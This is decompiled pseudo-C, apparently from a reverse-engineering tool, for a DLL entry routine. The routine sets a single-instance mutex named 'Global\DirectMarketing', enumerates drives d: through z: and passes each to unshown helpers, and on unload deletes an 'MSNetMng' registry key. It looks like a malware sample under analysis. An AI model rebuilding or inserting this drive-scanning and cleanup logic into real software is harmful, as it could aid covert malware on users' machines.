
undefined4 __cdecl FUN_10001893(undefined4 param_1)

{
  HANDLE pvVar1;
  DWORD DVar2;
  int iVar3;
  BOOL BVar4;
  int iVar5;
  undefined4 uVar6;
  undefined4 *puVar7;
  CHAR local_418;
  undefined4 local_417;
  CHAR local_218;
  undefined4 local_217;
  DWORD local_18;
  DWORD local_14;
  DWORD local_10;
  undefined2 *local_c;
  uint local_8;
  
  if ((char)param_1 == '\x01') {
    pvVar1 = CreateMutexA((LPSECURITY_ATTRIBUTES)0x0,1,s_Global_DirectMarketing_1000605c);
    if (pvVar1 == (HANDLE)0x0) {
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    DVar2 = GetLastError();
    if (DVar2 == 0xb7) {
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    DAT_1000626c = malloc(0x20000);
    if (DAT_1000626c != (void *)0x0) {
      memset(DAT_1000626c,0,0x20000);
      DAT_10006270 = 0x20000;
    }
    FUN_10001a85();
    pvVar1 = (HANDLE)FUN_10003618(DAT_10006250);
    if (pvVar1 == (HANDLE)0x0) {
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    DAT_10006258 = pvVar1;
    iVar3 = FUN_100038e3();
    if (iVar3 == 0) {
      CloseHandle(pvVar1);
      free(DAT_1000626c);
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    DAT_1000625c = iVar3;
    FUN_100024b9();
    local_418 = '\0';
    puVar7 = &local_417;
    for (iVar3 = 0x7f; iVar3 != 0; iVar3 = iVar3 + -1) {
      *puVar7 = 0;
      puVar7 = puVar7 + 1;
    }
    *(undefined2 *)puVar7 = 0;
    *(undefined *)((int)puVar7 + 2) = 0;
    local_218 = '\0';
    puVar7 = &local_217;
    for (iVar3 = 0x7f; iVar3 != 0; iVar3 = iVar3 + -1) {
      *puVar7 = 0;
      puVar7 = puVar7 + 1;
    }
    *(undefined2 *)puVar7 = 0;
    *(undefined *)((int)puVar7 + 2) = 0;
    param_1._1_3_ = (undefined3)((uint)DAT_10006058 >> 8);
    param_1 = CONCAT31(param_1._1_3_,100);
    local_8 = 0;
    do {
      BVar4 = GetVolumeInformationA
                        ((LPCSTR)&param_1,&local_418,0x200,&local_14,&local_10,&local_18,&local_218,
                         0x200);
      if (BVar4 != 0) {
        DAT_10006018 = (char)local_8 + 100;
        iVar3 = FUN_100042d5(&DAT_10006014,7);
        if (iVar3 != 0) {
          local_c = (undefined2 *)0x0;
          DAT_10006260 = DAT_10006018;
          iVar5 = FUN_100015a2(CONCAT31((int3)((uint)iVar3 >> 8),DAT_10006018),&local_c);
          if (iVar5 != 0) {
            FUN_10001114((uint)DAT_10006018,local_c);
            FUN_10002174(iVar3);
          }
        }
      }
      param_1 = CONCAT31(param_1._1_3_,(char)param_1 + '\x01');
      local_8 = local_8 + 1;
    } while (local_8 < 0x17);
    uVar6 = 1;
  }
  else {
    if ((char)param_1 == '\x02') {
      CloseHandle((HANDLE)0x0);
      CloseHandle(DAT_10006250);
      FUN_100036d4();
      FUN_100038ec();
      FUN_100024b9();
      free(DAT_1000626c);
      RegDeleteKeyA((HKEY)0x80000002,s_Software_Microsoft_MSNetMng_1000603c);
                    /* WARNING: Subroutine does not return */
      ExitThread(0);
    }
    uVar6 = 0;
  }
  return uVar6;
}

